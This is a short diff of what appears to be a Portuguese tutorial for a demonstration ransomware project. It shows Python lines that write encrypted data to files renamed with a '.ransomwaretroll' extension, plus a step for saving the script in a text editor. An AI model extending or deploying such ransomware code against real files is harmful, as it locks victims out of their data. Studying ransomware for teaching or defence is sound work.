@@ -62,6 +62,7 @@ new_file = file_name + ".ransomwaretroll"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
+
 9.  Salvar o arquivo com o ctrl + O e encerrar o arquivo com o comando ctrl + x
 
 ![capturadetela](/ProjetoDois/encripto.png))
